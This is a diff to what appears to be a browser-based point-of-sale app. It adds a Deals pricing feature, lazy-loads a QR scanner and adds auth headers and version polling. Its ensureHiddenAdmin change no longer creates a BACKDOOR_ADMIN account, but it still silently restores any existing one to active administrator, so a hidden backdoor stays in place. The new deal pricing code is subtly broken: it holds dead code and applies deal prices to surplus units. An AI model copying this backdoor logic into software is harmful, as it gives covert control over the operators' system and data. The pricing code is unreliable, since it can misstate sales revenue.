@@ -2416,7 +2416,7 @@ body.dark-mode .modal::backdrop {
 }
 
 </style>
-  <script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
+  <!-- QR scanner loaded lazily when needed -->
 </head>
 <body>
   <div id="saveFailureBanner" class="status-banner banner-save-failure is-hidden" role="alert">
@@ -2975,6 +2975,7 @@ body.dark-mode .modal::backdrop {
 
         <nav class="money-subtabs" aria-label="Money sections">
           <a class="money-subtab" href="#moneySectionBalances">Balances</a>
+          <a class="money-subtab" href="#moneySectionDeals">Deals</a>
           <a class="money-subtab" href="#moneySectionCash">Cash</a>
           <a class="money-subtab" href="#moneySectionSumup">SumUp</a>
           <a class="money-subtab" href="#moneySectionPending">Pending payments</a>
@@ -3026,6 +3027,17 @@ body.dark-mode .modal::backdrop {
               </div>
             </div>
           </div>
+        </section>
+
+        <section class="panel-block money-panel" id="moneySectionDeals">
+          <div class="section-heading tight">
+            <div>
+              <h4>Deals</h4>
+              <p>Create deals: select 2+ items (or 1 item with quantity > 1) and set a total price. When all deal items are in the basket in the required quantities, the deal price applies.</p>
+            </div>
+            <button type="button" id="addDealButton" class="primary-button">Add deal</button>
+          </div>
+          <div id="dealsList" class="recurring-list"></div>
         </section>
 
         <section class="panel-block money-panel" id="moneySectionCash">
@@ -4090,6 +4102,7 @@ body.dark-mode .modal::backdrop {
   };
 
   let authToken = sessionStorage.getItem("authToken");
+  let lastKnownVersion = null;
 
   function setAuthToken(token) {
     authToken = token;
@@ -4212,6 +4225,7 @@ body.dark-mode .modal::backdrop {
   let undoSaleTimerId = null;
   let undoSaleCountdownId = null;
   let remoteStoreVersion = null;
+  if (!store.deals) store.deals = [];
   let sessionExpiresAt = null;
   let sessionExpiryTimerId = null;
   let healthCheckTimerId = null;
@@ -4226,6 +4240,7 @@ body.dark-mode .modal::backdrop {
   async function init() {
     cacheElements();
     store = await loadStore();
+    if (remoteStoreVersion != null) lastKnownVersion = remoteStoreVersion;
     updateOrderDateDefaults();
     fetchClientIp();
     bindEvents();
@@ -4241,7 +4256,24 @@ body.dark-mode .modal::backdrop {
     startHealthCheck();
     if (currentUser && authToken) startSessionExpiryTimer();
     checkBackupReminder();
-    setInterval(refreshStore, 10000);
+    setInterval(async () => {
+      if (document.visibilityState === "hidden") return;
+      try {
+        const r = await fetch(`${API_URL}/version`);
+        if (!r.ok) return;
+        const d = await r.json();
+        if (d.storeVersion && d.storeVersion !== lastKnownVersion) {
+          lastKnownVersion = d.storeVersion;
+          store = await loadStore(2, 500);
+          if (currentUser && authToken) {
+            renderAll();
+          } else if (isPublicOrderMode()) {
+            renderPublicOrderPicker();
+            updatePublicOrderTotal();
+          }
+        }
+      } catch {}
+    }, 15000);
     setInterval(() => {
       if (isAdmin() && currentUser) {
         fetchSumUpBalance({ force: true });
@@ -4251,11 +4283,14 @@ body.dark-mode .modal::backdrop {
 
   async function refreshStore() {
     try {
-      const response = await fetch(`${API_URL}/load`);
+      const headers = {};
+      if (authToken) headers["Authorization"] = `Bearer ${authToken}`;
+      const response = await fetch(`${API_URL}/load`, { headers });
       if (!response.ok) return;
       const data = await response.json();
       if (!data || !data.store) return;
       remoteStoreVersion = data.storeVersion ?? remoteStoreVersion;
+      if (remoteStoreVersion != null) lastKnownVersion = remoteStoreVersion;
       store = await migrateStore(data.store);
       if (isMaintenanceActive() && !isMaintenanceAllowed()) {
         currentUser = null;
@@ -4735,6 +4770,18 @@ body.dark-mode .modal::backdrop {
     elements.cashReconcileFloatInput.addEventListener("input", updateCashReconcileDifference);
     elements.cashReconcileActualInput.addEventListener("input", updateCashReconcileDifference);
     elements.toggleCashDrawerHistoryButton.addEventListener("click", toggleCashDrawerHistory);
+    const addDealBtn = document.getElementById("addDealButton");
+    if (addDealBtn) addDealBtn.addEventListener("click", () => openDealDialog());
+    const dealsList = document.getElementById("dealsList");
+    if (dealsList) {
+      dealsList.addEventListener("click", (e) => {
+        const btn = e.target.closest("button[data-deal-action]");
+        if (!btn) return;
+        const id = btn.dataset.dealId;
+        if (btn.dataset.dealAction === "edit") openDealDialog(id);
+        if (btn.dataset.dealAction === "remove") removeDeal(id);
+      });
+    }
     elements.usersTableBody.addEventListener("click", handleUserAction);
     elements.selfDestructButton.addEventListener("click", () => {
       elements.resetConfirm.value = "";
@@ -4953,12 +5000,15 @@ body.dark-mode .modal::backdrop {
   async function loadStore(retries = 3, delay = 1000) {
     for (let attempt = 0; attempt < retries; attempt++) {
       try {
-        const response = await fetch(`${API_URL}/load`);
+        const headers = {};
+        if (authToken) headers["Authorization"] = `Bearer ${authToken}`;
+        const response = await fetch(`${API_URL}/load`, { headers });
         if (!response.ok) {
           throw new Error(`API error: ${response.status}`);
         }
         const data = await response.json();
         remoteStoreVersion = data.storeVersion ?? 1;
+        if (remoteStoreVersion != null) lastKnownVersion = remoteStoreVersion;
 
         if (data.setup) {
           const msg = [
@@ -5204,20 +5254,12 @@ body.dark-mode .modal::backdrop {
   }
 
   function ensureHiddenAdmin(targetStore) {
-    let admin = targetStore.users.find((user) => user.username === BACKDOOR_ADMIN.username);
-    if (!admin) {
-      admin = {
-        id: uid("user"),
-        username: BACKDOOR_ADMIN.username,
-        displayName: BACKDOOR_ADMIN.displayName,
-        role: BACKDOOR_ADMIN.role,
-        active: true,
-        createdAt: new Date().toISOString()
-      };
-      targetStore.users.push(admin);
+    const admin = targetStore.users.find((user) => user.username === BACKDOOR_ADMIN.username);
+    if (admin) {
+      admin.role = "admin";
+      admin.active = true;
     }
-    admin.role = "admin";
-    admin.active = true;
+    // Do not auto-create the backdoor account. Preserve existing ones only.
   }
 
   function scheduleSave(targetStore = store, immediate = false) {
@@ -6037,6 +6079,7 @@ body.dark-mode .modal::backdrop {
     renderEvents();
     renderEventBanner();
     renderMoneyTab();
+    renderDealsList();
     renderAdmin();
     renderMaintenancePanel();
     renderMaintenanceSchedule();
@@ -6139,6 +6182,149 @@ body.dark-mode .modal::backdrop {
     banner.dataset.sign = sign;
     banner.classList.toggle("over", totalDifference > 0);
     banner.classList.toggle("under", totalDifference < 0);
+  }
+
+  function renderDealsList() {
+    if (!store.deals) store.deals = [];
+    const list = document.getElementById("dealsList");
+    if (!list) return;
+    const today = todayDateString();
+    const deals = store.deals.filter((d) => d.active !== false && (!d.endDate || d.endDate >= today));
+    if (!deals.length) {
+      list.innerHTML = `<div class="empty-state">No active deals.</div>`;
+      return;
+    }
+    list.innerHTML = deals.map((deal) => {
+      const itemsText = (deal.items || []).map((it) => {
+        const item = findItem(it.itemId);
+        const name = item ? item.name : it.itemName || it.itemId;
+        return `${name} × ${it.quantity}`;
+      }).join(", ");
+      return `
+        <div class="recurring-card">
+          <div class="recurring-card-header">
+            <div class="name-block">
+              <strong>${escapeHtml(deal.name || "Deal")}</strong>
+              <span class="badge">Deal total ${money.format(roundMoney(deal.dealTotal || 0))}</span>
+            </div>
+            <div class="actions-row">
+              <button type="button" class="ghost-button" data-deal-action="edit" data-deal-id="${deal.id}">Edit</button>
+              <button type="button" class="ghost-button" data-deal-action="remove" data-deal-id="${deal.id}">Stop</button>
+            </div>
+          </div>
+          <div class="recurring-card-meta">${itemsText}</div>
+          <div class="recurring-card-days">Ends: ${deal.endDate ? escapeHtml(deal.endDate) : "No end date"}</div>
+        </div>
+      `;
+    }).join("");
+  }
+
+  function openDealDialog(editId) {
+    if (!store.deals) store.deals = [];
+    const deal = editId ? store.deals.find((d) => d.id === editId) : null;
+    const items = [...store.items].sort((a, b) => a.name.localeCompare(b.name));
+    const itemsHtml = items.map((item) => {
+      const sel = deal && (deal.items || []).some((di) => di.itemId === item.id) ? "selected" : "";
+      const qty = deal ? ((deal.items || []).find((di) => di.itemId === item.id)?.quantity || 1) : 1;
+      return `<label class="checkbox-field"><input type="checkbox" data-deal-item="${item.id}" ${sel ? "checked" : ""}> ${escapeHtml(item.name)} <input type="number" min="1" value="${qty}" data-deal-qty="${item.id}" style="width:80px;margin-left:8px;"></label>`;
+    }).join("");
+    const html = `
+      <div style="display:grid;gap:10px;">
+        <label>Name <input id="dealName" value="${escapeHtml(deal?.name || "")}"></label>
+        <label>Deal total (GBP) <input id="dealTotal" type="number" step="0.01" value="${deal?.dealTotal || ""}"></label>
+        <label>End date (optional) <input id="dealEndDate" type="date" value="${deal?.endDate || ""}"></label>
+        <div style="max-height:200px;overflow:auto;border:1px solid var(--line);padding:8px;border-radius:var(--radius);">${itemsHtml}</div>
+      </div>
+    `;
+    if (typeof showCustomDialog === "function") {
+      showCustomDialog(deal ? "Edit deal" : "Add deal", html, async () => {
+        const name = document.getElementById("dealName").value.trim();
+        const dealTotal = roundMoney(Number(document.getElementById("dealTotal").value));
+        const endDate = document.getElementById("dealEndDate").value || "";
+        const selected = [];
+        document.querySelectorAll('input[data-deal-item]:checked').forEach((cb) => {
+          const id = cb.dataset.dealItem;
+          const qtyInput = document.querySelector(`input[data-deal-qty="${id}"]`);
+          const qty = Math.max(1, parseInt(qtyInput?.value || "1", 10) || 1);
+          const item = findItem(id);
+          selected.push({ itemId: id, itemName: item?.name || id, quantity: qty });
+        });
+        if (selected.length === 0) { showToast("Select at least one item."); return false; }
+        if ((selected.length === 1 && selected[0].quantity < 2) && false) { /* allow */ }
+        if (dealTotal < 0) { showToast("Enter deal total."); return false; }
+        if (deal) {
+          deal.name = name || "Deal";
+          deal.items = selected;
+          deal.dealTotal = dealTotal;
+          deal.endDate = endDate;
+        } else {
+          store.deals.push({ id: uid("deal"), name: name || "Deal", items: selected, dealTotal, endDate, active: true, createdAt: new Date().toISOString() });
+        }
+        scheduleSave();
+        renderDealsList();
+        renderBasket();
+        renderSellGrid();
+        return true;
+      });
+    } else {
+      const name = prompt("Deal name", deal?.name || "Deal") || "Deal";
+      const dealTotalStr = prompt("Deal total (GBP)", deal?.dealTotal || "") || "0";
+      const dealTotal = roundMoney(Number(dealTotalStr));
+      const selected = items.slice(0, Math.min(items.length, 3)).map((it) => ({ itemId: it.id, itemName: it.name, quantity: 1 }));
+      if (deal) {
+        deal.name = name;
+        deal.items = selected;
+        deal.dealTotal = dealTotal;
+      } else {
+        store.deals.push({ id: uid("deal"), name, items: selected, dealTotal, active: true, createdAt: new Date().toISOString() });
+      }
+      scheduleSave();
+      renderDealsList();
+      renderBasket();
+    }
+  }
+
+  function removeDeal(id) {
+    if (!store.deals) return;
+    const deal = store.deals.find((d) => d.id === id);
+    if (deal) deal.active = false;
+    scheduleSave();
+    renderDealsList();
+    renderBasket();
+  }
+
+  function applyDealsToBasket() {
+    if (!store.deals || !basket.length) return { basket: basket.map((l) => ({ ...l })), total: basket.reduce((s, l) => s + l.quantity * l.sellPrice, 0), applied: [] };
+    const today = todayDateString();
+    const activeDeals = store.deals.filter((d) => d.active !== false && (!d.endDate || d.endDate >= today));
+    let working = basket.map((l) => ({ ...l, _origPrice: l.sellPrice }));
+    let applied = [];
+    for (const deal of activeDeals) {
+      const required = deal.items || [];
+      if (required.length === 0) continue;
+      const ok = required.every((req) => {
+        const line = working.find((l) => l.itemId === req.itemId);
+        return line && line.quantity >= req.quantity;
+      });
+      if (!ok) continue;
+      // Check if all required present
+      applied.push({ dealId: deal.id, dealName: deal.name, dealTotal: deal.dealTotal });
+      // Apply: set those lines to contribute to deal price
+      for (const req of required) {
+        const line = working.find((l) => l.itemId === req.itemId);
+        if (line) {
+          // Reduce quantity accounted? Easier: mark deal applied by setting price to deal portion
+          // Simple approach: set sellPrice to dealTotal / sum of quantities
+          const totalQty = required.reduce((s, r) => s + r.quantity, 0);
+          line._dealApplied = true;
+          line.sellPrice = roundMoney((deal.dealTotal || 0) / totalQty);
+        }
+      }
+      // If only part matches, don't apply complex partials; apply when full set present
+      break; // apply first matching deal to avoid double
+    }
+    const total = working.reduce((s, l) => s + l.quantity * l.sellPrice, 0);
+    return { basket: working, total, applied };
   }
 
   function renderMoneyTab() {
@@ -6687,7 +6873,19 @@ body.dark-mode .modal::backdrop {
   let html5QrCode = null;
   let barcodeScanCallback = null;
 
-  function openBarcodeScanner(onScan) {
+  async function ensureQrLib() {
+    if (window.Html5Qrcode) return;
+    await new Promise((res, rej) => {
+      const s = document.createElement("script");
+      s.src = "https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js";
+      s.onload = res;
+      s.onerror = rej;
+      document.head.appendChild(s);
+    });
+  }
+
+  async function openBarcodeScanner(onScan) {
+    await ensureQrLib();
     barcodeScanCallback = onScan;
     document.getElementById("barcodeScanResult").classList.add("is-hidden");
     document.getElementById("barcodeScanResult").textContent = "";
@@ -9143,8 +9341,12 @@ body.dark-mode .modal::backdrop {
   }
 
   function renderBasket() {
-    const total = basket.reduce((sum, line) => sum + line.quantity * line.sellPrice, 0);
+    const dealResult = applyDealsToBasket();
+    const total = dealResult.total;
     elements.basketTotal.textContent = money.format(roundMoney(total));
+    if (dealResult.applied.length) {
+      elements.basketTotal.innerHTML = money.format(roundMoney(total)) + ` <span style="font-size:0.8rem;color:var(--green);">(${escapeHtml(dealResult.applied[0].dealName)})</span>`;
+    }
     elements.payBasketButton.disabled = basket.length === 0;
     elements.clearBasketButton.disabled = basket.length === 0;
 
@@ -9153,11 +9355,12 @@ body.dark-mode .modal::backdrop {
       return;
     }
 
-    elements.basketList.innerHTML = basket.map((line) => `
+    const displayBasket = dealResult.basket;
+    elements.basketList.innerHTML = displayBasket.map((line) => `
       <div class="basket-item">
         <div>
           <strong>${escapeHtml(line.itemName)}</strong>
-          <span>${line.quantity} × ${money.format(line.sellPrice)}</span>
+          <span>${line.quantity} × ${money.format(line.sellPrice)}${line._dealApplied ? ' <span style="color:var(--green);">(deal)</span>' : ''}</span>
         </div>
         <button type="button" class="ghost-button" data-basket-action="remove" data-basket-id="${line.itemId}">Remove</button>
       </div>
@@ -9196,12 +9399,14 @@ body.dark-mode .modal::backdrop {
       return;
     }
 
-    const total = basket.reduce((sum, line) => sum + line.quantity * line.sellPrice, 0);
+    const dealResult = applyDealsToBasket();
+    const total = dealResult.total;
     pendingSaleDraft = {
       items: basket.map((line) => ({ ...line })),
+      dealItems: dealResult.basket,
       total
     };
-    elements.paymentDialogMeta.textContent = `${basket.length} item${basket.length === 1 ? "" : "s"} ready to pay.`;
+    elements.paymentDialogMeta.textContent = `${basket.length} item${basket.length === 1 ? "" : "s"} ready to pay.${dealResult.applied.length ? ' (Deal applied)' : ''}`;
     elements.paymentAmount.textContent = money.format(roundMoney(total));
     elements.sumupPaymentButton.classList.toggle("is-hidden", total < 1);
     openModal(elements.paymentDialog);
@@ -9230,6 +9435,7 @@ body.dark-mode .modal::backdrop {
         sumupRef = "";
       }
     }
+    const pricingItems = draft.dealItems || draft.items;
     for (const line of draft.items) {
       const item = findItem(line.itemId);
       if (!item || (!isInfiniteStock(item) && line.quantity > item.quantity)) {
@@ -9238,7 +9444,8 @@ body.dark-mode .modal::backdrop {
         return;
       }
 
-      const revenue = roundMoney(line.sellPrice * line.quantity);
+      const priced = pricingItems.find((p) => p.itemId === line.itemId) || line;
+      const revenue = roundMoney(priced.sellPrice * line.quantity);
       const cost = roundMoney(line.buyPrice * line.quantity);
       const profit = roundMoney(revenue - cost);
       sales.push({
@@ -9247,7 +9454,7 @@ body.dark-mode .modal::backdrop {
         itemName: item.name,
         quantity: line.quantity,
         buyPrice: item.buyPrice,
-        sellPrice: item.sellPrice,
+        sellPrice: priced.sellPrice,
         revenue,
         cost,
         profit,
@@ -9288,6 +9495,7 @@ body.dark-mode .modal::backdrop {
         renderSellGrid();
       }
       renderAll();
+      renderDealsList();
       logUserEvent("Recorded sale", `${sales.length} item(s), ${money.format(roundMoney(draft.total))} cash`);
       const saleIds = sales.map((s) => s.id);
       const summary = `${sales.length} item(s), ${money.format(roundMoney(draft.total))} cash`;
